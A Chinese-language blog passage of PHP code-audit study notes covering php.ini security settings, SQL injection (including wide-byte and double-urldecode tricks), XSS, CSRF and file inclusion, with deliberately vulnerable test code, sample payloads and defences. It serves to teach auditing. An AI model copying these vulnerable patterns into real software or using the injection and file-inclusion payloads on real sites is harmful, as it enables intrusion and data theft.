<p>同样<strong>在PHP5.4版本以后也取消了</strong></p>
<p>注意，只有部分函数受它影响，所以是可以绕过这个配值的。</p>
<p>受影响的包括get_meta_tags()、stream_socket_recvform()、exec()…等等</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#文件1.txt  1 '2"3\4</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"magic_quotes_runtime"</span>,<span class="string">"1"</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"D:/phpstudy_pro/WWW/phpsafe/1.txt"</span>);<span class="comment">#把整个文件读入一个字符串中</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> \<span class="string">'2\"3\\4</span></span><br></pre></td></tr></table></figure>

<h3 id="5-magic-quotes-sybase-魔术引号自动过滤"><a href="#5-magic-quotes-sybase-魔术引号自动过滤" class="headerlink" title="5.magic_quotes_sybase(魔术引号自动过滤)"></a><strong>5.magic_quotes_sybase(魔术引号自动过滤)</strong></h3><p>magic_quotes_sybase指令用于自动过滤特殊字符，设置为on时，会覆盖gpc的配值</p>
<p>它和gpc的区别在于，仅仅转义了空字符和把单引号( ’ )变成了双引号( “ )</p>
<p>在PHP5.4.0中移除了</p>
<h3 id="6-safe-mode-安全模式"><a href="#6-safe-mode-安全模式" class="headerlink" title="6.safe_mode(安全模式)"></a><strong>6.safe_mode(安全模式)</strong></h3><p>安全模式是PHP内嵌的一种安全机制，当safe_mode=on时：</p>
<p>（1）所有文件操作函数都会收到限制</p>
<p>（2）通过函数popen()、system()以及exec()等函数执行命令或程序会提示错误</p>
<h3 id="7-open-basedir-PHP-可访问目录"><a href="#7-open-basedir-PHP-可访问目录" class="headerlink" title="7.open_basedir PHP 可访问目录"></a><strong>7.open_basedir PHP 可访问目录</strong></h3><p>open_basedi指令用来限制PHP只能访问哪些目录</p>
<p>例如配值open_basedi=/www/a，那么目录/www/a 和 /www/ab 都是可以访问的。</p>
<p>如果open_basedi=/www/a/，那么只能访问/www/a/</p>
<p>PHP版本小于5.2.3时，是PHP_INI_SYSTEM，</p>
<p>大于等于5.2.3是PHP_INI_ALL</p>
<h3 id="8-disable-functions-禁用函数"><a href="#8-disable-functions-禁用函数" class="headerlink" title="8.disable_functions(禁用函数)"></a><strong>8.disable_functions(禁用函数)</strong></h3><p>在正式的生产环境中，为了更安全的运行PHP，使用此指令来禁止一些敏感函数的使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">disable_functions=phpinfo,<span class="keyword">eval</span>,passthru,exec,system</span><br></pre></td></tr></table></figure>

<p>配值禁用函数的时候，按照以上格式分割函数名，配值范围是php.ini only</p>
<p>切记，也要把dl()函数加到禁用列表，因为攻击者可以利用dl()函数来加载自定义的PHP扩展以突破限制。</p>
<h3 id="9-display-errors和error-reporting-错误显示"><a href="#9-display-errors和error-reporting-错误显示" class="headerlink" title="9.display_errors和error_reporting 错误显示"></a><strong>9.display_errors和error_reporting 错误显示</strong></h3><p>display_errors 表示是否显示PHP脚本内部错误，在调试的时候通常打开，但是在生产环境中建议关闭。</p>
<p>error_reporting 是用来配值错误显示的级别。</p>
<hr>
<h2 id="通用代码审计思路"><a href="#通用代码审计思路" class="headerlink" title="通用代码审计思路"></a><strong>通用代码审计思路</strong></h2><h3 id="1-敏感函数回溯参数过程"><a href="#1-敏感函数回溯参数过程" class="headerlink" title="1.敏感函数回溯参数过程"></a><strong>1.敏感函数回溯参数过程</strong></h3><hr>
<h2 id="漏洞挖掘与防范（基础篇）"><a href="#漏洞挖掘与防范（基础篇）" class="headerlink" title="漏洞挖掘与防范（基础篇）"></a><strong>漏洞挖掘与防范（基础篇）</strong></h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a><strong>1.SQL注入</strong></h3><p>本质：SQL注入是直接面对数据库进行攻击的</p>
<p>攻击方式：</p>
<p>一、在权限较大的情况下，可通过SQL注入直接写入webshell或者直接执行系统命令</p>
<p>二、在权限较小的情况下，可获得管理员密码等，或者修改数据库内容进行钓鱼等</p>
<p>常用工具：sqlmap</p>
<p>挖掘经验：sql注入经常出现在登录页面、获取HTTP头、订单处理等</p>
<p>登录页面的注入多数发生在HTTP头里面的client-ip和x-forward-for</p>
<p>1.1普通注入</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$uid=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$sql=<span class="string">"SELECT*FROM userinfo where id=$uid"</span>;</span><br><span class="line">$conn=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysqli_select_db($conn,<span class="string">"test"</span>);</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">print_r(<span class="string">'当前SQL语句：'</span>.$sql.<span class="string">'&lt;br/&gt;结果：'</span>);</span><br><span class="line">print_r(mysqli_fetch_row($result));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#4.1php?id=-1 union select 1,user(),3,4</span></span><br><span class="line">当前SQL语句：SELECT*FROM userinfo where id=<span class="number">-1</span> union select <span class="number">1</span>,user(),<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">结果：<span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">1</span> [<span class="number">1</span>] =&gt; root@localhost [<span class="number">2</span>] =&gt; <span class="number">3</span> [<span class="number">3</span>] =&gt; <span class="number">4</span> )</span><br></pre></td></tr></table></figure>

<p>需要注意的是，7.x版本中已经舍弃了mysql_connect()，所以需要改为mysqli_connect()</p>
<table>
<thead>
<tr>
<th><strong>mysqli_fetch_row()</strong></th>
<th><strong>从结果集中取得一行，并作为枚举数组返回。</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>mysqli_select_db()</strong></td>
<td><strong>用于更改连接的默认数据库</strong></td>
</tr>
<tr>
<td><strong>mysqli_query()</strong></td>
<td><strong>执行某个针对数据库的查询。</strong></td>
</tr>
<tr>
<td><strong>mysqli_connect()</strong></td>
<td><strong>打开一个到 MySQL 服务器的新的连接</strong></td>
</tr>
</tbody></table>
<p>从上述测试代码可以知道，数据库操作存在一些关键词如mysqli_query等，查询方式还有update、insert、delete等</p>
<p>在做白盒审计的时候，只需要查找这些关键字就可以定向挖掘SQL注入漏洞。</p>
<h3 id="2-编码注入-宽字节注入"><a href="#2-编码注入-宽字节注入" class="headerlink" title="2.编码注入-宽字节注入"></a><strong>2.编码注入-宽字节注入</strong></h3><p>程序在操作前会进行一些编码处理，通过输入转码函数不兼容的特殊字符，可以导致输出的字符变成有害数据</p>
<p>最常见的编码注入是MySQL宽字节以及urldecode/rawurldecode函数导致的</p>
<p><strong>mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</strong></p>
<p>这是由于单引号被自动转义成 \‘  , 前面的<strong>%df和转义字符\ 反斜杠(%5c) 组合成了 %df%5c</strong> 。也就是運字</p>
<p>这时候单引号依然还在，于是成功闭合了前面的单引号</p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'bad!'</span>);</span><br><span class="line">mysqli_select_db($conn,<span class="string">"test"</span>)<span class="keyword">OR</span> emMsg(<span class="string">"连接数据库失败，未找到您填写的数据库"</span>);</span><br><span class="line">mysqli_query($conn,<span class="string">"set names 'gbk'"</span>);</span><br><span class="line">$uid=addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql=<span class="string">"SELECT*FROM userinfo where id='$uid'"</span>;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span> (!$result) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"wro"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">print_r(<span class="string">'当前SQL语句：'</span>.$sql.<span class="string">'&lt;br/&gt;结果：'</span>);</span><br><span class="line">print_r(mysqli_fetch_row($result));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=%df<span class="string">' union select 1,2,3,4#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">当前SQL语句：<span class="keyword">SELECT</span> <span class="keyword">id</span>,username <span class="keyword">FROM</span> userinfo <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'�\'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="keyword">user</span>()<span class="comment">#'</span></span><br><span class="line">结果：<span class="built_in">Array</span> ( [<span class="number">0</span>] =&gt; <span class="keyword">test</span> [<span class="number">1</span>] =&gt; root@localhost )</span><br></pre></td></tr></table></figure>

<h3 id="3-二次urldecode注入"><a href="#3-二次urldecode注入" class="headerlink" title="3.二次urldecode注入"></a><strong>3.二次urldecode注入</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=addslashes($_GET[<span class="string">'p'</span>]);</span><br><span class="line">$b=urldecode($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$a='</span>.$a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$b='</span>.$b;</span><br></pre></td></tr></table></figure>

<p>输入：<strong>?p=1%2527</strong></p>
<p>输出：*<em>$a=1%27     *</em></p>
<p>​           <strong>$b=1’</strong></p>
<p>现在的Web程序通常用<strong>addslashes()、mysql_real_escape_string()、mysql_escape_string()函数</strong></p>
<p>或者开启GPC对<strong>单引号、双引号、\  和NULL 加  \   转义</strong></p>
<p>但如果使用<strong>了urldecode or  rawurldecode 函数</strong> 会导致二次解码生成单引号而引发注入</p>
<p>4.espcms 搜索注入分析</p>
<p>部分代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$key=urldecode(<span class="keyword">$this</span>-&gt;fun-&gt;accept(<span class="string">'key'</span>,<span class="string">'R'</span>));</span><br><span class="line">···</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($key))&#123;</span><br><span class="line">	$db_where.=<span class="string">"AND FIND_IN_SET('$key',tags)"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于$key变量使用了urldecode，从而可以绕过GPC</p>
<p>如果$key不为空，则拼接到SQL语句中，导致产生注入漏洞</p>
<h3 id="4-漏洞防范"><a href="#4-漏洞防范" class="headerlink" title="4.漏洞防范"></a><strong>4.漏洞防范</strong></h3><p>在PHP5.4版本之前可以用魔术引号解决</p>
<p>后面虽然被取消了，但可以用<strong>过滤函数和类</strong>来解决</p>
<p>如discuz、dedecms、phpcms等程序都使用了过滤类</p>
<p>但仍然存在绕过的问题，最好的解决方法是利用<strong>预编译的方式</strong></p>
<h4 id="4-1-gpc-rutime-魔术引号"><a href="#4-1-gpc-rutime-魔术引号" class="headerlink" title="4.1 gpc/rutime 魔术引号"></a><strong>4.1 gpc/rutime 魔术引号</strong></h4><p>通常数据污染有2种，一种是GET、POST等被动接收参数</p>
<p>还有一种是主动获取参数，如读取远程页面或者文件内容</p>
<p>所以防止SQL注入，就是要守住这2条路！</p>
<p>魔术引号对int型的注入是没多大作用的。</p>
<h4 id="4-2-过滤函数和类"><a href="#4-2-过滤函数和类" class="headerlink" title="4.2 过滤函数和类"></a><strong>4.2 过滤函数和类</strong></h4><p>过滤函数和类有2种使用场景，一种是程序入口统一过滤，像框架程序用的多</p>
<p>另一种是在程序进行SQL语句之前使用，除了PHP内置的一些过滤单引号等函数外</p>
<p>还有一些开源类过滤union、select等关键字</p>
<p><strong>1.addslashes</strong>函数</p>
<p>以下方法可以绕过该函数</p>
<table>
<thead>
<tr>
<th>$userid = urldecode($userid)</th>
<th>注入语句进行两次编码，首先通过addslashes()过滤，然后urlencode解码</th>
</tr>
</thead>
<tbody><tr>
<td><strong>$userid = rawurldecode($userid)</strong></td>
<td></td>
</tr>
<tr>
<td><strong>$userid = base64_decode($userid)</strong></td>
<td><strong>首先通过addslashes()过滤，然后urlencode解码</strong></td>
</tr>
<tr>
<td><strong>$userid = json_encode($userid)</strong></td>
<td><strong>该函数把\转换为\，两个反斜杠抵消。</strong></td>
</tr>
</tbody></table>
<p><strong>2.mysql_ (real_) escape_string 函数</strong></p>
<p>这2个函数都是对字符串进行过滤，在PHP4.0.3以上版本才存在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x00 \n \r \ &#39; &quot; \xla    这些字符受到影响</span><br></pre></td></tr></table></figure>

<p>推荐使用mysql_real_escape_string() ，因为它接受的是一个连接句柄并根据当前字符集转义字符串</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">"select * from test where id=' "</span>.$id.<span class="string">" '  "</span>;</span><br></pre></td></tr></table></figure>

<p>当id=1’ 时，输出id=’ 1 \ ‘’</p>
<p><strong>3.intval 等字符转换</strong></p>
<p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id=intval(<span class="string">"1 union select"</span>);</span><br><span class="line"><span class="keyword">echo</span> $id;  <span class="comment">#输出为1</span></span><br></pre></td></tr></table></figure>

<p>intval 是将变量转换成int型,可以防止盲注等方式绕过。</p>
<h4 id="4-3-PDO-prepare-预编译"><a href="#4-3-PDO-prepare-预编译" class="headerlink" title="4.3 PDO prepare 预编译"></a><strong>4.3 PDO prepare 预编译</strong></h4><h3 id="5-XSS漏洞"><a href="#5-XSS漏洞" class="headerlink" title="5.XSS漏洞"></a><strong>5.XSS漏洞</strong></h3><p>在Web漏洞中，XSS是最多的！它可以通过外部输入然后直接在浏览器端触发，即<strong>反射型XSS</strong></p>
<p>还可以通过把代码保存在数据库或文件中，当Web程序读取利用代码并输出在页面时触发–<strong>存储型XSS</strong></p>
<p>危害：前端页面能做的事情，它都可以（如获取cookie，修改页面钓鱼等）</p>
<h4 id="5-1-挖掘经验"><a href="#5-1-挖掘经验" class="headerlink" title="5.1 挖掘经验"></a><strong>5.1 挖掘经验</strong></h4><p>挖掘XSS漏洞的关键在于寻找没有被过滤的参数，且这些参数传入到输出函数</p>
<p>常用的输出函数如下：<strong>var_dump、var_export、die、sprintf、print、print_r、echo、printf</strong></p>
<p>所以只需要寻作带有变量的这些函数即可</p>
<p>注意：<strong>浏览器环境十分影响XSS漏洞的利用</strong>，还需要掌握各种<strong>浏览器容错、编码等特性和数据协议</strong></p>
<p>XSS漏洞经常出现在<strong>文章发表、评论回复、留言以及资料设置</strong>等地方</p>
<p>因为这里有各种图片引用、文字格式设置等，经常出现<strong>对标签事件过滤不严格</strong>导致的XSS</p>
<p>还有就是用户昵称可能不止一处可以修改，不一定所有地方都严格过滤了，所以可以多关注这几个地方</p>
<h4 id="5-2-反射型XSS"><a href="#5-2-反射型XSS" class="headerlink" title="5.2 反射型XSS"></a><strong>5.2 反射型XSS</strong></h4><p>可通过扫描器黑盒直接发现</p>
<p>只需要将&lt;&gt;、‘ 、“ 等题交到Web服务器，检查返回的HTML页面是否保留原来的特殊字符就可以判断</p>
<p>在白盒审计中，只需要寻作带有参数的输出函数，然后根据输出函数对输出内容回溯输入参数，观察是否经过过滤</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下是QQ私密接口</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"openid"</span>])&#123;</span><br><span class="line">    <span class="comment">//授权成功后，会返回用户的openid</span></span><br><span class="line">    <span class="comment">//检查返回的openid是否是合法id</span></span><br><span class="line">    <span class="keyword">if</span>(!is_valid_openid($_GET[<span class="string">"openid"</span>],$_GET[<span class="string">"timestamp"</span>],$_GET[<span class="string">"oauth_signature"</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        showerr(<span class="string">'API账号有误！'</span>);</span><br><span class="line">        <span class="comment">//demo对错误简单处理</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"##invalid openid\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"sig:"</span>.$_GET[<span class="string">"oauth_signature"</span>].<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>代码中echo “sig:”.$ _GET [“oauth_signature”].”\n”;   直接将  $ _ GET [“oauth_signature”] 的值输出到浏览器</p>
<p>所以可以直接利用GET方式注入代码</p>
<h4 id="5-3-存储型XSS分析"><a href="#5-3-存储型XSS分析" class="headerlink" title="5.3 存储型XSS分析"></a><strong>5.3 存储型XSS分析</strong></h4><p>代码如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;span styele=<span class="string">"color:##FF6600"</span> title=<span class="string">"&lt;img src=&#123;#$list.link_logo#&#125; border=0/&gt;"</span> </span><br><span class="line">class="vtio"&gt;[logo]&lt;/span&gt;</span><br></pre></td></tr></table></figure>

<p>这里代码直接把显示logo的img标签放在span标签的title里面</p>
<p>当鼠标滑过的时候，会调用事件执行显示title，即执行img标签</p>
<p>所以这里的利用点就是可以是HTML实体编码，从而绕过安全检查</p>
<p>在logo处输入 1 oner&114;or=ale &amp; #114;t(1)</p>
<h4 id="5-4-XSS漏洞防范"><a href="#5-4-XSS漏洞防范" class="headerlink" title="5.4 XSS漏洞防范"></a><strong>5.4 XSS漏洞防范</strong></h4><p>特殊字符HTML实体转码</p>
<p>标签事件属性黑白名单</p>
<h3 id="6-CSRF漏洞"><a href="#6-CSRF漏洞" class="headerlink" title="6.CSRF漏洞"></a><strong>6.CSRF漏洞</strong></h3><p>CSRF=Cross-site request forgery 跨站请求伪造</p>
<p>通俗来讲就是劫持其它用户去进行一些请求</p>
<p>简单的攻击流程讲解：</p>
<p>假设直接请求x.com/del.php?id=1 可以删除ID为1的账号，但是需要管理权限</p>
<p>如果在其它网站页面加入&lt; img src=” http: //x.com/del.php?id=1 “&gt;,让管理员打开，就达到目的了</p>
<p>更严重的像添加管理员账号、修改网站配值直接写入webshell等等</p>
<h4 id="6-1-挖掘经验"><a href="#6-1-挖掘经验" class="headerlink" title="6.1 挖掘经验"></a><strong>6.1 挖掘经验</strong></h4><p>CSRF主要是用于越权操作，所有漏洞自然在有权限控制的地方，像管理后台、会员中心</p>
<p>论坛帖子以及交意管理等，管理后台又是最高危的地方</p>
<p>挖掘CSRF的时候，可以先搭好环境，打开几个非静态操作的页面，抓包查看有没有token</p>
<p>如果没有token，直接请求这个页面，不带refer</p>
<p>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</p>
<p>从白盒的角度来说，只要读代码的时候看看几个核心文件里面有没有验证token和referer相关的代码，这里的核心文件是指被大量文件引用的基础文件，或者直接搜”token”这个关键词。</p>
<h4 id="6-2-漏洞防范"><a href="#6-2-漏洞防范" class="headerlink" title="6.2 漏洞防范"></a><strong>6.2 漏洞防范</strong></h4><p>防御CSRF漏洞的最主要问题是解决可信的问题，即使是管理员权限提交到服务器的数据也不一定是完全可信的</p>
<p>所以有2种方式：1）增加token/referer验证，避免img标签请求的水坑攻击 2）增加验证码</p>
<p><strong>1.Token验证</strong></p>
<p>token翻译为”标志”，在计算机认证领域叫令牌</p>
<p>简单理解为在页面或者cookie里加一个不可预测的字符串，服务器在接收操作请求的时候只要验证下这个字符串是不是上次访问留下的，即可判断。</p>
<p>因为如果没有访问上一个页面，是无法得到这个token的，除非结合XSS漏洞或者其它手段获得通信数据</p>
<p>Token实现测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">function set_token()&#123;</span><br><span class="line">	$_SESSION[&#39;token&#39;]&#x3D;md5(time()+rand(1,1000));</span><br><span class="line">&#125;</span><br><span class="line">function check_token()&#123;</span><br><span class="line">	if(isset($_POST[&#39;token&#39;])&amp;&amp;$_POST[&#39;token&#39;]&#x3D;&#x3D;&#x3D;$_SESSION[&#39;token&#39;])</span><br><span class="line">	&#123;</span><br><span class="line">		return true;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123; return false;&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_SESSION[&#39;token&#39;])&amp;&amp;check_token())&#123;</span><br><span class="line">	echo &quot;success&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;failed&quot;;&#125;</span><br><span class="line">set_token();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;token&quot; value&#x3D;&quot;&lt;?&#x3D;$_SESSION[&#39;token&#39;]?&gt;&quot;&gt;</span><br><span class="line">	&lt;input type&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>



<hr>
<h2 id="漏洞挖掘与防范（进阶篇）"><a href="#漏洞挖掘与防范（进阶篇）" class="headerlink" title="漏洞挖掘与防范（进阶篇）"></a><strong>漏洞挖掘与防范（进阶篇）</strong></h2><h3 id="1-文件包含漏洞"><a href="#1-文件包含漏洞" class="headerlink" title="1.文件包含漏洞"></a><strong>1.文件包含漏洞</strong></h3><p>文件包含分为本地和远程包含，渗透过程中文件包含漏洞大多可以直接利用<strong>获取webshell</strong></p>
<p>文件包含函数有<strong>include()、include_once()、require()、require_once()</strong></p>
<p>它们之间的区别在于<strong>include()、include_once()</strong>在包含文件出错的时候，下面的代码依旧执行</p>
<p>而<strong>require()、require_once()</strong>会直接报错退出程序</p>
<h4 id="1-1挖掘经验"><a href="#1-1挖掘经验" class="headerlink" title="1.1挖掘经验"></a><strong>1.1挖掘经验</strong></h4><p>文件包含漏洞大多出现在模块加载、模板加载、以及cache调用的地方</p>
<h4 id="1-2-本地文件包含"><a href="#1-2-本地文件包含" class="headerlink" title="1.2 本地文件包含"></a><strong>1.2 本地文件包含</strong></h4><p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment">//初始化....</span></span><br><span class="line">define(<span class="string">"ROOT"</span>,dirname(<span class="string">'_FILE_'</span>).<span class="string">'/'</span>);</span><br><span class="line"><span class="comment">//加载模块</span></span><br><span class="line">$mod=$_GET[<span class="string">'mod'</span>];</span><br><span class="line"><span class="keyword">echo</span> ROOT.$mod.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT.$mod.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//5.2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.png" style="zoom:80%;">

<p>本地文件包含是指只能包含本机文件的文件包含漏洞，大多出现在<strong>模块加载、模板加载和cache调用</strong>这些地方</p>
<p>本地文件包含有多种利用方式，比如上传一个<strong>允许上传的文件格式的文件</strong>再包含来执行代码，包含PHP上传的临时文件</p>
<p>在请求URL或者ua里面加入要执行的代码，<strong>WebServer记录到日志后再包含WebServer的日志</strong></p>
<h4 id="1-3-远程文件包含"><a href="#1-3-远程文件包含" class="headerlink" title="1.3 远程文件包含"></a><strong>1.3 远程文件包含</strong></h4><p>远程文件包含是指可以包含远程文件的包含漏洞，远程文件包含需要设置<strong>allow_url_include=On</strong></p>
<p>相对于本地文件包含，它更容易利用，但出现的频率较低</p>
<p>下面是基于HTTP协议测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'url'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/phpsafe/5.2.php?url=http://192.168.2.108/1.txt</span></span><br><span class="line"><span class="comment">//1.txt的内容是<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">//打印出本机phpinfo的信息</span></span><br></pre></td></tr></table></figure>

<p>远程文件包含还有一种PHP输入输出流的利用方式，可以直接执行POST代码</p>
<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png" style="zoom:80%;">

<h4 id="1-4-文件包含截断"><a href="#1-4-文件包含截断" class="headerlink" title="1.4 文件包含截断"></a><strong>1.4 文件包含截断</strong></h4><p>第一种是利用%00来截断，这是最古老的一种</p>
<hr>
<h2 id="PHP常用函数"><a href="#PHP常用函数" class="headerlink" title="PHP常用函数"></a>PHP常用函数</h2><h3 id="print-r-函数"><a href="#print-r-函数" class="headerlink" title="print_r() 函数"></a><strong>print_r() 函数</strong></h3><p><strong>print_r()</strong> 函数用于打印变量，以更容易理解的形式展示，PHP 版本要求: PHP 4, PHP 5, PHP 7</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span> (<span class="string">'a'</span> =&gt; <span class="string">'apple'</span>, <span class="string">'b'</span> =&gt; <span class="string">'banana'</span>, <span class="string">'c'</span> =&gt; <span class="keyword">array</span> (<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>));</span><br><span class="line">print_r ($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [a] =&gt; apple [b] =&gt; banana [c] =&gt; <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; x [<span class="number">1</span>] =&gt; y [<span class="number">2</span>] =&gt; z ) )</span><br></pre></td></tr></table></figure>



<h3 id="echo、print、print-r-三者区别"><a href="#echo、print、print-r-三者区别" class="headerlink" title="echo、print、print_r 三者区别"></a><strong>echo、print、print_r 三者区别</strong></h3><table>
<thead>
<tr>
<th align="center"></th>
<th align="center">属性</th>
<th align="center">打印输出</th>
<th align="center">用法</th>
<th align="center">返回值</th>
<th align="center">执行          速率</th>
</tr>
</thead>
<tbody><tr>
<td align="center">echo</td>
<td align="center">PHP语句</td>
<td align="center">输出一个或者多个字符串</td>
<td align="center">echo   或者 echo()</td>
<td align="center">无</td>
<td align="center">最快</td>
</tr>
<tr>
<td align="center">print</td>
<td align="center">实际上不是函数（而是语言结构），所以可以不用圆括号包围参数列表</td>
<td align="center">只能打印出简单类型变量的值(如int,string)</td>
<td align="center">print  或者print()</td>
<td align="center">1</td>
<td align="center">其次</td>
</tr>
<tr>
<td align="center">print_r</td>
<td align="center">函数,语句没有返回值,函数可以有返回值(即便没有用)</td>
<td align="center">可以打印出复杂类型变量的值(如数组,对象)</td>
<td align="center">print_r()</td>
<td align="center">输出成功时，返回true，不成功时返回false</td>
<td align="center">最慢</td>
</tr>
</tbody></table>
<hr>
<h2 id="SQL常用语句解释"><a href="#SQL常用语句解释" class="headerlink" title="SQL常用语句解释"></a>SQL常用语句解释</h2><h3 id="union"><a href="#union" class="headerlink" title="union"></a>union</h3><p>select <strong>id,username</strong> from userinfo  where id=1 <strong>union</strong> select <strong>1,2</strong></p>
<p>注意，union前后的列数要一样！</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>python渗透之路</title>
    <url>/2020/03/12/python%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<hr>
<p>[TOC]</p>
<h3 id="python3-语法笔记"><a href="#python3-语法笔记" class="headerlink" title="python3 语法笔记"></a>python3 语法笔记</h3><h4 id="data-b’’-join-buffer-如何理解？"><a href="#data-b’’-join-buffer-如何理解？" class="headerlink" title="data=b’’.join(buffer)如何理解？"></a><strong>data=b’’.join(buffer)如何理解？</strong></h4><p>b’’是一个空字节，join是连接列表的函数，buffer是一个字节串的列表<br>连起来的意思就是使用空字节把buffer这个字节列表连接在一起，成为一个新的字节串<br>这个是python3新的地方，以前join只能连接字符串，现在可以连接字节串<br>功能就是把[b’ab’,b’cd’,b’ef’]变成 b’abcdef’ </p>
<h4 id="time-sleep-t"><a href="#time-sleep-t" class="headerlink" title="time.sleep(t)"></a><strong>time.sleep(t)</strong></h4><p>需要加 import time</p>
<h4 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a><strong>socket()函数</strong></h4><p>服务器端套接字</p>
